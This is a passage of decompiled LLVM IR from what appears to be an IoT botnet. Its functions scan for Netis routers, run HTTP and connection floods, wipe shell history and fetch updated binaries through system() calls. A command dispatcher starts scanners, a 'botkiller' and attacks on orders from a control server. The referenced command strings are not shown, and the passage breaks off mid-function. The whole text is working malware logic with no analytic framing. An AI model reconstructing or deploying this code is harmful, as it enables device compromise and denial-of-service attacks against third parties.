  uselistorder i32 49, { 0, 1, 3, 2 }
  uselistorder [3 x i8]* @global_var_1ab10.42, { 1, 0 }
  uselistorder label %dec_label_pc_ef08, { 1, 0 }
}

define i32 @NetisScanner(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 61436, i32* %stack_var_-4, align 4
  %v2_eff8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_eff8, i32* @fp, align 4
  %v2_f058 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_f000

dec_label_pc_f000:                                ; preds = %dec_label_pc_f000, %entry
  %v0_f00c = call i32 @socket()
  store i32 2, i32* %stack_var_-48, align 4
  %v1_f030 = call i32 @htons(i32 add (i32 ptrtoint (i32* @global_var_d100.513 to i32), i32 -91))
  %v0_f044 = call i32 @NetisRanges()
  %v3_f084 = call i32 @strlen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1bcd8.515, i32 0, i32 0))
  %v8_f0a8 = call i32 @__libc_sendto(i32 %v0_f00c, i32* bitcast ([16 x i8]* @global_var_1bcd8.515 to i32*), i32 %v3_f084, i32 0, i32 %v2_f058, i32 16)
  %v3_f0b0 = call i32 @strlen(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1bcec.517, i32 0, i32 0))
  %v8_f0d4 = call i32 @__libc_sendto(i32 %v0_f00c, i32* bitcast ([3 x i8]* @global_var_1bcec.517 to i32*), i32 %v3_f0b0, i32 0, i32 %v2_f058, i32 16)
  %v1_f0dc = call i32 @__libc_close(i32 %v0_f00c)
  br label %dec_label_pc_f000

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @ClearHistory(i32 %arg1) local_unnamed_addr {
entry:
  %v3_f0f0 = load i32, i32* @fp, align 4
  %v2_f0fc = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_1bd8c.519 to i32))
  %v2_f104 = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_1bda4.521 to i32))
  %v2_f10c = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_1bdc4.523 to i32))
  store i32 %v3_f0f0, i32* @fp, align 4
  ret i32 %v2_f10c
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = sext i8 %arg3 to i32
  %stack_var_-3152 = alloca i32, align 4
  %stack_var_-2628 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_f124 = load i32, i32* @r4, align 4
  store i32 %v3_f124, i32* %stack_var_-20, align 4
  %v6_f124 = load i32, i32* @fp, align 4
  store i32 61740, i32* %stack_var_-4, align 4
  %v16_f124 = ptrtoint i32* %stack_var_-20 to i32
  %v2_f128 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f128, i32* @fp, align 4
  %v2_f150 = ptrtoint i32* %stack_var_-2628 to i32
  store i32 ptrtoint ([649 x i8*]* @global_var_227c4.827 to i32), i32* @r1, align 4
  store i32 %v2_f150, i32* @r0, align 4
  store i32 2596, i32* @r2, align 4
  %v0_f168 = call i32 @memcpy()
  %v2_f184 = call i32 @__GI_time(i32* null)
  %v3_f18c = load i32, i32* %stack_var_0, align 4
  %v2_f190 = add i32 %v3_f18c, %v2_f184
  %v0_f198 = call i32 @random()
  %v2_f1a8 = srem i32 %v0_f198, 30
  %v3_f1bc = mul nsw i32 %v2_f1a8, 4
  %v2_f1c4 = add i32 %v3_f1bc, %v16_f124
  %v2_f1c8 = add i32 %v2_f1c4, -2620
  %v1_f1cc = inttoptr i32 %v2_f1c8 to i32*
  %v2_f1cc = load i32, i32* %v1_f1cc, align 4
  store i32 %v2_f1cc, i32* @r4, align 4
  %v0_f1d0 = call i32 @random()
  %v2_f1e4 = srem i32 %v0_f1d0, 674
  %v3_f1f8 = mul nsw i32 %v2_f1e4, 4
  %v2_f200 = add i32 %v3_f1f8, %v16_f124
  %v2_f204 = add i32 %v2_f200, -2608
  %v1_f208 = inttoptr i32 %v2_f204 to i32*
  %v2_f208 = load i32, i32* %v1_f208, align 4
  %v2_f210 = ptrtoint i32* %stack_var_-3152 to i32
  %v0_f214 = load i32, i32* @r4, align 4
  store i32 %v2_f210, i32* @r0, align 4
  %v7_f22c = call i32 @sprintf(i32 %v2_f210, i32 ptrtoint ([62 x i8]* @global_var_231e8.836 to i32), i32 %arg2, i32 %arg4, i32 %v0_f214, i32 %v2_f208)
  br label %dec_label_pc_f2e4

dec_label_pc_f23c:                                ; preds = %dec_label_pc_f2e4
  %v0_f23c = call i32 @__libc_fork()
  %v2_f244 = icmp eq i32 %v0_f23c, 0
  %v1_f2dc = add nuw i32 %storemerge2, 1
  br i1 %v2_f244, label %dec_label_pc_f2e4, label %dec_label_pc_f2b8.preheader

dec_label_pc_f2b8.preheader:                      ; preds = %dec_label_pc_f23c
  %tmp28 = bitcast i32* %stack_var_-3152 to i8*
  br label %dec_label_pc_f2b8

dec_label_pc_f250:                                ; preds = %dec_label_pc_f2b8
  %v5_f270 = call i32 @socket_connect(i32 %arg1, i8 %arg3, i32 %tmp)
  %v2_f280 = icmp eq i32 %v5_f270, 0
  br i1 %v2_f280, label %dec_label_pc_f2b8, label %dec_label_pc_f288

dec_label_pc_f288:                                ; preds = %dec_label_pc_f250
  %v3_f294 = call i32 @strlen(i8* %tmp28)
  store i32 %v3_f294, i32* @r2, align 4
  %v3_f2ac = call i32 @__libc_write(i32 %v5_f270, i32* nonnull %stack_var_-3152)
  %v1_f2b4 = call i32 @__libc_close(i32 %v5_f270)
  br label %dec_label_pc_f2b8

dec_label_pc_f2b8:                                ; preds = %dec_label_pc_f250, %dec_label_pc_f288, %dec_label_pc_f2b8.preheader
  %v2_f2bc = call i32 @__GI_time(i32* null)
  %v5_f2cc = icmp slt i32 %v2_f2bc, %v2_f190
  br i1 %v5_f2cc, label %dec_label_pc_f250, label %dec_label_pc_f2d0

dec_label_pc_f2d0:                                ; preds = %dec_label_pc_f2b8
  %v1_f2d4 = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_f2e4:                                ; preds = %dec_label_pc_f23c, %entry
  %v12_f2f8 = phi i32 [ %v7_f22c, %entry ], [ 0, %dec_label_pc_f23c ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_f2dc, %dec_label_pc_f23c ]
  %v5_f2f0 = icmp slt i32 %storemerge2, %arg6
  br i1 %v5_f2f0, label %dec_label_pc_f23c, label %dec_label_pc_f2f4

dec_label_pc_f2f4:                                ; preds = %dec_label_pc_f2e4
  %v2_f2f8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_f2f8, i32* @r4, align 4
  store i32 %v6_f124, i32* @fp, align 4
  ret i32 %v12_f2f8

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %v5_f270, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_f2b8, { 1, 0, 2 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_f328 = call i32 @__GI_time(i32* null)
  %v2_f334 = add i32 %v2_f328, %arg3
  store i32 %arg1, i32* @r0, align 4
  %v1_f344 = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_f368 = urem i32 %arg2, 65536
  %v1_f370 = call i32 @htons(i32 %v3_f368)
  %v3_f3b0 = bitcast i32* %stack_var_-40 to %sockaddr*
  br label %dec_label_pc_f3c4

dec_label_pc_f388:                                ; preds = %dec_label_pc_f3c4
  %v0_f394 = call i32 @socket()
  %v4_f3b0 = call i32 @__libc_connect(i32 %v0_f394, %sockaddr* %v3_f3b0, i32 16)
  %v1_f3b8 = call i32 @sleep(i32 1)
  %v1_f3c0 = call i32 @__libc_close(i32 %v0_f394)
  br label %dec_label_pc_f3c4

dec_label_pc_f3c4:                                ; preds = %entry, %dec_label_pc_f388
  %v2_f3c8 = call i32 @__GI_time(i32* null)
  %v5_f3d8 = icmp slt i32 %v2_f3c8, %v2_f334
  br i1 %v5_f3d8, label %dec_label_pc_f388, label %dec_label_pc_f3dc

dec_label_pc_f3dc:                                ; preds = %dec_label_pc_f3c4
  ret i32 %v2_f3c8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_f3c4, { 1, 0 }
}

define i32 @UpdateBins(i32 %arg1) local_unnamed_addr {
entry:
  %v0_f3f4 = call i32 @__libc_fork()
  %v2_f404 = icmp eq i32 %v0_f3f4, 0
  br i1 %v2_f404, label %dec_label_pc_f40c, label %dec_label_pc_f420

dec_label_pc_f40c:                                ; preds = %entry
  %v2_f410 = call i32 @__libc_system(i32 ptrtoint ([439 x i8]* @global_var_23228.838 to i32))
  %v1_f418 = call i32 @sleep(i32 20)
  br label %dec_label_pc_f42c

dec_label_pc_f420:                                ; preds = %entry
  %v4_f428 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_233e0.840, i32 0, i32 0), i32 %v0_f3f4)
  br label %dec_label_pc_f42c

dec_label_pc_f42c:                                ; preds = %dec_label_pc_f40c, %dec_label_pc_f420
  %storemerge = phi i32 [ %v4_f428, %dec_label_pc_f420 ], [ %v1_f418, %dec_label_pc_f40c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_f42c, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_f438 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_f438, i32* @ip, align 4
  %v3_f43c = load i32, i32* @r4, align 4
  %v6_f43c = load i32, i32* @r5, align 4
  %v9_f43c = load i32, i32* @r6, align 4
  %v12_f43c = load i32, i32* @r7, align 4
  %v15_f43c = load i32, i32* @r8, align 4
  %v18_f43c = load i32, i32* @fp, align 4
  store i32 62532, i32* %stack_var_-4, align 4
  %v2_f440 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f440, i32* @fp, align 4
  %v2_f454 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_233e4.842 to i32), i32* @r1, align 4
  %v3_f460 = inttoptr i32 %v2_f454 to i8*
  %v4_f460 = call i32 @__GI_strcoll(i8* %v3_f460, i32 ptrtoint ([7 x i8]* @global_var_233e4.842 to i32))
  %v2_f468 = icmp eq i32 %v4_f460, 0
  br i1 %v2_f468, label %dec_label_pc_f470, label %dec_label_pc_f580

dec_label_pc_f470:                                ; preds = %entry
  %v1_f474 = add i32 %tmp, 4
  %v1_f478 = inttoptr i32 %v1_f474 to i32*
  %v2_f478 = load i32, i32* %v1_f478, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_233ec.844 to i32), i32* @r1, align 4
  %v3_f484 = inttoptr i32 %v2_f478 to i8*
  %v4_f484 = call i32 @__GI_strcoll(i8* %v3_f484, i32 ptrtoint ([8 x i8]* @global_var_233ec.844 to i32))
  %v2_f48c = icmp eq i32 %v4_f484, 0
  br i1 %v2_f48c, label %dec_label_pc_f494, label %dec_label_pc_f4b4

dec_label_pc_f494:                                ; preds = %dec_label_pc_f470
  %v2_f498 = call i32 @__libc_system(i32 ptrtoint ([130 x i8]* @global_var_233f4.846 to i32))
  %v1_f49c = call i32 @ClearHistory(i32 %v2_f498)
  %v2_f4a4 = load i32, i32* @global_var_2d604.55, align 4
  %v3_f4b0 = call i32 @sockprintf(i32 %v2_f4a4, i32 ptrtoint ([26 x i8]* @global_var_23478.849 to i32))
  br label %dec_label_pc_f4b4

dec_label_pc_f4b4:                                ; preds = %dec_label_pc_f470, %dec_label_pc_f494
  %v2_f4bc = load i32, i32* %v1_f478, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_23494.851 to i32), i32* @r1, align 4
  %v3_f4c8 = inttoptr i32 %v2_f4bc to i8*
  %v4_f4c8 = call i32 @__GI_strcoll(i8* %v3_f4c8, i32 ptrtoint ([7 x i8]* @global_var_23494.851 to i32))
  %v2_f4d0 = icmp eq i32 %v4_f4c8, 0
  br i1 %v2_f4d0, label %dec_label_pc_f4d8, label %dec_label_pc_f4f8

dec_label_pc_f4d8:                                ; preds = %dec_label_pc_f4b4
  %v2_f4dc = call i32 @__libc_system(i32 ptrtoint ([47 x i8]* @global_var_2349c.853 to i32))
  %v1_f4e0 = call i32 @ClearHistory(i32 %v2_f4dc)
  %v2_f4e8 = load i32, i32* @global_var_2d604.55, align 4
  %v3_f4f4 = call i32 @sockprintf(i32 %v2_f4e8, i32 ptrtoint ([24 x i8]* @global_var_234cc.855 to i32))
  br label %dec_label_pc_f4f8

dec_label_pc_f4f8:                                ; preds = %dec_label_pc_f4b4, %dec_label_pc_f4d8
  %v2_f500 = load i32, i32* %v1_f478, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_234e4.857 to i32), i32* @r1, align 4
  %v3_f50c = inttoptr i32 %v2_f500 to i8*
  %v4_f50c = call i32 @__GI_strcoll(i8* %v3_f50c, i32 ptrtoint ([4 x i8]* @global_var_234e4.857 to i32))
  %v2_f514 = icmp eq i32 %v4_f50c, 0
  br i1 %v2_f514, label %dec_label_pc_f51c, label %dec_label_pc_f53c

dec_label_pc_f51c:                                ; preds = %dec_label_pc_f4f8
  %v2_f520 = call i32 @__libc_system(i32 ptrtoint ([31 x i8]* @global_var_234e8.859 to i32))
  %v1_f524 = call i32 @ClearHistory(i32 %v2_f520)
  %v2_f52c = load i32, i32* @global_var_2d604.55, align 4
  %v3_f538 = call i32 @sockprintf(i32 %v2_f52c, i32 ptrtoint ([24 x i8]* @global_var_23508.861 to i32))
  br label %dec_label_pc_f53c

dec_label_pc_f53c:                                ; preds = %dec_label_pc_f4f8, %dec_label_pc_f51c
  %v2_f544 = load i32, i32* %v1_f478, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_23520.863 to i32), i32* @r1, align 4
  %v3_f550 = inttoptr i32 %v2_f544 to i8*
  %v4_f550 = call i32 @__GI_strcoll(i8* %v3_f550, i32 ptrtoint ([6 x i8]* @global_var_23520.863 to i32))
  %v2_f558 = icmp eq i32 %v4_f550, 0
  br i1 %v2_f558, label %dec_label_pc_f560, label %dec_label_pc_f580

dec_label_pc_f560:                                ; preds = %dec_label_pc_f53c
  %v2_f564 = call i32 @__libc_system(i32 ptrtoint ([40 x i8]* @global_var_23528.865 to i32))
  %v1_f568 = call i32 @ClearHistory(i32 %v2_f564)
  %v2_f570 = load i32, i32* @global_var_2d604.55, align 4
  %v3_f57c = call i32 @sockprintf(i32 %v2_f570, i32 ptrtoint ([28 x i8]* @global_var_23550.867 to i32))
  br label %dec_label_pc_f580

dec_label_pc_f580:                                ; preds = %dec_label_pc_f53c, %entry, %dec_label_pc_f560
  %v2_f584 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b33c.57 to i32), i32* @r1, align 4
  %v3_f590 = inttoptr i32 %v2_f584 to i8*
  %v4_f590 = call i32 @__GI_strcoll(i8* %v3_f590, i32 ptrtoint ([5 x i8]* @global_var_1b33c.57 to i32))
  %v2_f598 = icmp eq i32 %v4_f590, 0
  br i1 %v2_f598, label %dec_label_pc_f5a0, label %dec_label_pc_f5b8

dec_label_pc_f5a0:                                ; preds = %dec_label_pc_f580
  %v2_f5a4 = load i32, i32* @global_var_2d604.55, align 4
  %v3_f5b0 = call i32 @sockprintf(i32 %v2_f5a4, i32 ptrtoint ([6 x i8]* @global_var_2356c.870 to i32))
  br label %dec_label_pc_1070c

dec_label_pc_f5b8:                                ; preds = %dec_label_pc_f580
  %v2_f5bc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_23574.872 to i32), i32* @r1, align 4
  %v3_f5c8 = inttoptr i32 %v2_f5bc to i8*
  %v4_f5c8 = call i32 @__GI_strcoll(i8* %v3_f5c8, i32 ptrtoint ([6 x i8]* @global_var_23574.872 to i32))
  %v2_f5d0 = icmp eq i32 %v4_f5c8, 0
  br i1 %v2_f5d0, label %dec_label_pc_f5d8, label %dec_label_pc_f5fc

dec_label_pc_f5d8:                                ; preds = %dec_label_pc_f5b8
  %v2_f5dc = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_f5dc, i32* @r4, align 4
  %v0_f5e0 = call i32 @getdtablesize()
  %v0_f5e8 = load i32, i32* @r4, align 4
  store i32 %v0_f5e0, i32* @r2, align 4
  %v3_f5f4 = call i32 @sockprintf(i32 %v0_f5e8, i32 ptrtoint ([3 x i8]* @global_var_2357c.874 to i32))
  br label %dec_label_pc_1070c

dec_label_pc_f5fc:                                ; preds = %dec_label_pc_f5b8
  %v2_f600 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_23494.851 to i32), i32* @r1, align 4
  %v3_f60c = inttoptr i32 %v2_f600 to i8*
  %v4_f60c = call i32 @__GI_strcoll(i8* %v3_f60c, i32 ptrtoint ([7 x i8]* @global_var_23494.851 to i32))
  %v2_f614 = icmp eq i32 %v4_f60c, 0
  br i1 %v2_f614, label %dec_label_pc_f61c, label %dec_label_pc_f63c

dec_label_pc_f61c:                                ; preds = %dec_label_pc_f5fc
  %v2_f620 = load i32, i32* @global_var_2d604.55, align 4
  %v3_f62c = call i32 @sockprintf(i32 %v2_f620, i32 ptrtoint ([25 x i8]* @global_var_23580.876 to i32))
  %v1_f634 = call i32 @UpdateBins(i32 1)
  br label %dec_label_pc_1070c

dec_label_pc_f63c:                                ; preds = %dec_label_pc_f5fc
  %v2_f640 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_2359c.878 to i32), i32* @r1, align 4
  %v3_f64c = inttoptr i32 %v2_f640 to i8*
  %v4_f64c = call i32 @__GI_strcoll(i8* %v3_f64c, i32 ptrtoint ([8 x i8]* @global_var_2359c.878 to i32))
  %v2_f654 = icmp eq i32 %v4_f64c, 0
  br i1 %v2_f654, label %dec_label_pc_f65c, label %dec_label_pc_f778

dec_label_pc_f65c:                                ; preds = %dec_label_pc_f63c
  %v1_f660 = add i32 %tmp, 4
  %v1_f664 = inttoptr i32 %v1_f660 to i32*
  %v2_f664 = load i32, i32* %v1_f664, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_234e4.857 to i32), i32* @r1, align 4
  %v3_f670 = inttoptr i32 %v2_f664 to i8*
  %v4_f670 = call i32 @__GI_strcoll(i8* %v3_f670, i32 ptrtoint ([4 x i8]* @global_var_234e4.857 to i32))
  %v2_f678 = icmp eq i32 %v4_f670, 0
  br i1 %v2_f678, label %dec_label_pc_f680, label %dec_label_pc_f6c4

dec_label_pc_f680:                                ; preds = %dec_label_pc_f65c
  %v2_f684 = load i32, i32* @global_var_33888.880, align 4
  %v2_f688 = icmp eq i32 %v2_f684, 0
  br i1 %v2_f688, label %dec_label_pc_1070c, label %dec_label_pc_f690

dec_label_pc_f690:                                ; preds = %dec_label_pc_f680
  %v0_f6a0 = call i32 @kill()
  %v2_f6a8 = load i32, i32* @global_var_2d604.55, align 4
  %v3_f6b4 = call i32 @sockprintf(i32 %v2_f6a8, i32 ptrtoint ([17 x i8]* @global_var_235a4.882 to i32))
  store i32 0, i32* @global_var_33888.880, align 4
  br label %dec_label_pc_f6c4

dec_label_pc_f6c4:                                ; preds = %dec_label_pc_f65c, %dec_label_pc_f690
  %v2_f6cc = load i32, i32* %v1_f664, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_235b8.884 to i32), i32* @r1, align 4
  %v3_f6d8 = inttoptr i32 %v2_f6cc to i8*
  %v4_f6d8 = call i32 @__GI_strcoll(i8* %v3_f6d8, i32 ptrtoint ([3 x i8]* @global_var_235b8.884 to i32))
  %v2_f6e0 = icmp eq i32 %v4_f6d8, 0
  br i1 %v2_f6e0, label %dec_label_pc_f6e8, label %dec_label_pc_f778

dec_label_pc_f6e8:                                ; preds = %dec_label_pc_f6c4
  %v2_f6ec = load i32, i32* @global_var_33888.880, align 4
  %v2_f6f0 = icmp eq i32 %v2_f6ec, 0
  br i1 %v2_f6f0, label %dec_label_pc_f6f8, label %dec_label_pc_1070c

dec_label_pc_f6f8:                                ; preds = %dec_label_pc_f6e8
  %v0_f6f8 = call i32 @__libc_fork()
  %v2_f718 = icmp eq i32 %v0_f6f8, 0
  br i1 %v2_f718, label %dec_label_pc_f73c, label %dec_label_pc_f720

dec_label_pc_f720:                                ; preds = %dec_label_pc_f6f8
  store i32 %v0_f6f8, i32* @global_var_33888.880, align 4
  br label %dec_label_pc_1070c

dec_label_pc_f73c:                                ; preds = %dec_label_pc_f6f8
  %v2_f740 = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_f740, i32* @r4, align 4
  %v2_f748 = load i32, i32* @global_var_33880.317, align 4
  store i32 %v2_f748, i32* @r0, align 4
  %v1_f74c = call i32 @__GI_inet_ntoa(i32 %v2_f748)
  %v0_f754 = load i32, i32* @r4, align 4
  store i32 %v1_f74c, i32* @r2, align 4
  %v3_f760 = call i32 @sockprintf(i32 %v0_f754, i32 ptrtoint ([26 x i8]* @global_var_235bc.887 to i32))
  %v2_f76c = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_f774 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_f778:                                ; preds = %dec_label_pc_f6c4, %dec_label_pc_f63c
  %v2_f77c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_235d8.889 to i32), i32* @r1, align 4
  %v3_f788 = inttoptr i32 %v2_f77c to i8*
  %v4_f788 = call i32 @__GI_strcoll(i8* %v3_f788, i32 ptrtoint ([6 x i8]* @global_var_235d8.889 to i32))
  %v2_f790 = icmp eq i32 %v4_f788, 0
  br i1 %v2_f790, label %dec_label_pc_f798, label %dec_label_pc_f8b0

dec_label_pc_f798:                                ; preds = %dec_label_pc_f778
  %v1_f79c = add i32 %tmp, 4
  %v1_f7a0 = inttoptr i32 %v1_f79c to i32*
  %v2_f7a0 = load i32, i32* %v1_f7a0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_234e4.857 to i32), i32* @r1, align 4
  %v3_f7ac = inttoptr i32 %v2_f7a0 to i8*
  %v4_f7ac = call i32 @__GI_strcoll(i8* %v3_f7ac, i32 ptrtoint ([4 x i8]* @global_var_234e4.857 to i32))
  %v2_f7b4 = icmp eq i32 %v4_f7ac, 0
  br i1 %v2_f7b4, label %dec_label_pc_f7bc, label %dec_label_pc_f814

dec_label_pc_f7bc:                                ; preds = %dec_label_pc_f798
  %v2_f7c0 = load i32, i32* @global_var_33888.880, align 4
  %v2_f7c4 = icmp eq i32 %v2_f7c0, 0
  br i1 %v2_f7c4, label %dec_label_pc_1070c, label %dec_label_pc_f7cc

dec_label_pc_f7cc:                                ; preds = %dec_label_pc_f7bc
  %v0_f7dc = call i32 @kill()
  %v2_f7e4 = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_f7e4, i32* @r4, align 4
  %v2_f7ec = load i32, i32* @global_var_33880.317, align 4
  store i32 %v2_f7ec, i32* @r0, align 4
  %v1_f7f0 = call i32 @__GI_inet_ntoa(i32 %v2_f7ec)
  %v0_f7f8 = load i32, i32* @r4, align 4
  store i32 %v1_f7f0, i32* @r2, align 4
  %v3_f804 = call i32 @sockprintf(i32 %v0_f7f8, i32 ptrtoint ([23 x i8]* @global_var_235e0.891 to i32))
  store i32 0, i32* @global_var_33888.880, align 4
  br label %dec_label_pc_f814

dec_label_pc_f814:                                ; preds = %dec_label_pc_f798, %dec_label_pc_f7cc
  %v2_f81c = load i32, i32* %v1_f7a0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_235b8.884 to i32), i32* @r1, align 4
  %v3_f828 = inttoptr i32 %v2_f81c to i8*
  %v4_f828 = call i32 @__GI_strcoll(i8* %v3_f828, i32 ptrtoint ([3 x i8]* @global_var_235b8.884 to i32))
  %v2_f830 = icmp eq i32 %v4_f828, 0
  br i1 %v2_f830, label %dec_label_pc_f838, label %dec_label_pc_f8b0

dec_label_pc_f838:                                ; preds = %dec_label_pc_f814
  %v2_f83c = load i32, i32* @global_var_33888.880, align 4
  %v2_f840 = icmp eq i32 %v2_f83c, 0
  br i1 %v2_f840, label %dec_label_pc_f848, label %dec_label_pc_1070c

dec_label_pc_f848:                                ; preds = %dec_label_pc_f838
  %v0_f848 = call i32 @__libc_fork()
  %v2_f858 = icmp eq i32 %v0_f848, 0
  br i1 %v2_f858, label %dec_label_pc_f87c, label %dec_label_pc_f860

dec_label_pc_f860:                                ; preds = %dec_label_pc_f848
  store i32 %v0_f848, i32* @global_var_33888.880, align 4
  br label %dec_label_pc_1070c

dec_label_pc_f87c:                                ; preds = %dec_label_pc_f848
  %v2_f880 = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_f880, i32* @r4, align 4
  %v2_f888 = load i32, i32* @global_var_33880.317, align 4
  store i32 %v2_f888, i32* @r0, align 4
  %v1_f88c = call i32 @__GI_inet_ntoa(i32 %v2_f888)
  %v0_f894 = load i32, i32* @r4, align 4
  store i32 %v1_f88c, i32* @r2, align 4
  %v3_f8a0 = call i32 @sockprintf(i32 %v0_f894, i32 ptrtoint ([23 x i8]* @global_var_235f8.893 to i32))
  %v1_f8a4 = call i32 @NetisScanner(i32 %v3_f8a0)
  %v1_f8ac = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_f8b0:                                ; preds = %dec_label_pc_f814, %dec_label_pc_f778
  %v2_f8b4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_23610.895 to i32), i32* @r1, align 4
  %v3_f8c0 = inttoptr i32 %v2_f8b4 to i8*
  %v4_f8c0 = call i32 @__GI_strcoll(i8* %v3_f8c0, i32 ptrtoint ([8 x i8]* @global_var_23610.895 to i32))
  %v2_f8c8 = icmp eq i32 %v4_f8c0, 0
  br i1 %v2_f8c8, label %dec_label_pc_f8d0, label %dec_label_pc_f914

dec_label_pc_f8d0:                                ; preds = %dec_label_pc_f8b0
  %v0_f8d0 = call i32 @listFork()
  %v2_f8d8 = icmp eq i32 %v0_f8d0, 0
  br i1 %v2_f8d8, label %dec_label_pc_f8e0, label %dec_label_pc_f914

dec_label_pc_f8e0:                                ; preds = %dec_label_pc_f8d0
  %v2_f8e4 = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_f8e4, i32* @r4, align 4
  %v2_f8ec = load i32, i32* @global_var_33880.317, align 4
  store i32 %v2_f8ec, i32* @r0, align 4
  %v1_f8f0 = call i32 @__GI_inet_ntoa(i32 %v2_f8ec)
  %v0_f8f8 = load i32, i32* @r4, align 4
  store i32 %v1_f8f0, i32* @r2, align 4
  %v3_f904 = call i32 @sockprintf(i32 %v0_f8f8, i32 ptrtoint ([29 x i8]* @global_var_23618.897 to i32))
  %v1_f908 = call i32 @botkiller(i32 %v3_f904)
  %v1_f910 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_f914:                                ; preds = %dec_label_pc_f8d0, %dec_label_pc_f8b0
  %v2_f918 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_23638.899 to i32), i32* @r1, align 4
  %v3_f924 = inttoptr i32 %v2_f918 to i8*
  %v4_f924 = call i32 @__GI_strcoll(i8* %v3_f924, i32 ptrtoint ([12 x i8]* @global_var_23638.899 to i32))
  %v2_f92c = icmp eq i32 %v4_f924, 0
  br i1 %v2_f92c, label %dec_label_pc_f934, label %dec_label_pc_f960

dec_label_pc_f934:                                ; preds = %dec_label_pc_f914
  %v2_f938 = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_f938, i32* @r4, align 4
  %v2_f940 = load i32, i32* @global_var_33880.317, align 4
  store i32 %v2_f940, i32* @r0, align 4
  %v1_f944 = call i32 @__GI_inet_ntoa(i32 %v2_f940)
  %v0_f94c = load i32, i32* @r4, align 4
  store i32 %v1_f944, i32* @r2, align 4
  %v3_f958 = call i32 @sockprintf(i32 %v0_f94c, i32 ptrtoint ([17 x i8]* @global_var_23644.901 to i32))
  br label %dec_label_pc_1070c

dec_label_pc_f960:                                ; preds = %dec_label_pc_f914
  %v2_f964 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_23658.903 to i32), i32* @r1, align 4
  %v3_f970 = inttoptr i32 %v2_f964 to i8*
  %v4_f970 = call i32 @__GI_strcoll(i8* %v3_f970, i32 ptrtoint ([4 x i8]* @global_var_23658.903 to i32))
  %v2_f978 = icmp eq i32 %v4_f970, 0
  br i1 %v2_f978, label %dec_label_pc_f980, label %dec_label_pc_fce0

dec_label_pc_f980:                                ; preds = %dec_label_pc_f960
  %v7_f988 = icmp slt i32 %arg1, 6
  br i1 %v7_f988, label %dec_label_pc_faa0, label %dec_label_pc_f98c

dec_label_pc_f98c:                                ; preds = %dec_label_pc_f980
  %v1_f990 = add i32 %tmp, 12
  %v1_f994 = inttoptr i32 %v1_f990 to i32*
  %v2_f994 = load i32, i32* %v1_f994, align 4
  store i32 %v2_f994, i32* @r0, align 4
  %v1_f99c = call i32 @atol(i32 %v2_f994)
  %v7_f9a4 = icmp eq i32 %v1_f99c, -1
